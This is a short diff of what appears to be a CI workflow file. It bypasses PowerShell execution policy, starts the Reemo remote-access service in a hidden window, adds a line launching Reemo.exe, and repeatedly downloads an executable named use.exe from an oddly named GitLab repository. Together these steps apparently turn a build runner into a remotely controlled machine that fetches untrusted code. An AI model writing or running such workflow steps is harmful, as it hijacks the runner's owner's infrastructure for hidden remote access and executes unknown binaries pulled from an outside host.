@@ -16,6 +16,7 @@ jobs:
       run: |
            powershell -ExecutionPolicy Bypass -File "setup.ps1"
            Start-Process "$Env:ProgramFiles\Reemo\service\reemod.exe" -WindowStyle Hidden
+           Start-Process "$Env:ProgramFiles\Reemo\Reemo.exe"
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            sleep 240
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
